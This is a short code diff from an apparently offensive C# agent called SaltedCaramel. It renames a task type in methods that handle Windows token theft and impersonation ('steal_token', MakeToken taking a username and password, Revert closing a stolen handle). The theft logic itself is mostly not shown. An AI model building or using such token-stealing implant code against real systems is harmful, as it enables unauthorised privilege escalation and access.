@@ -9,7 +9,7 @@ namespace SaltedCaramel.Tasks
     {
         public static IntPtr stolenHandle;
 
-        public static void Execute(SCTaskObject task)
+        public static void Execute(SCTask task)
         {
             if (task.command == "steal_token")
             {
@@ -21,13 +21,13 @@ namespace SaltedCaramel.Tasks
             }
         }
 
-        public static void MakeToken(SCTaskObject task)
+        public static void MakeToken(SCTask task)
         {
             string user = task.@params.Split(' ')[0];
             string pass = task.@params.Split(' ')[1];
         }
 
-        public static void StealToken(SCTaskObject task)
+        public static void StealToken(SCTask task)
         {
             try
             {
@@ -108,7 +108,7 @@ namespace SaltedCaramel.Tasks
                 task.message = e.Message;
             }
         }
-        public static void Revert(SCTaskObject task)
+        public static void Revert(SCTask task)
         {
             Win32.Kernel32.CloseHandle(stolenHandle);
             stolenHandle = IntPtr.Zero;
